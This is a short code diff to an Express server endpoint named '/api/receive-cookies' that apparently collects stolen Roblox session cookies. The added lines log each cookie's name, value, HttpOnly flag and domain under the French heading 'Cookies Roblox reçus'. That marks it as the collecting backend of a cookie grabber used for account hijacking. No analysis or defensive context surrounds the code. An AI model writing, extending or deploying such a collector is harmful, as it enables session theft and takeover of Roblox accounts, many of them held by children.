@@ -12,7 +12,10 @@ app.post("/api/receive-cookies", (req, res) => {
   }
 
   const cookies = req.body;
-
+  console.log("=== Cookies Roblox reçus ===");
+    cookies.forEach(c => {
+    console.log(`${c.name} = ${c.value} (HttpOnly: ${c.httpOnly}, Domain: ${c.domain})`);
+  });
   console.log("Cookies reçus :", cookies.map(c => ({
     name: c.name,
     value: c.value,
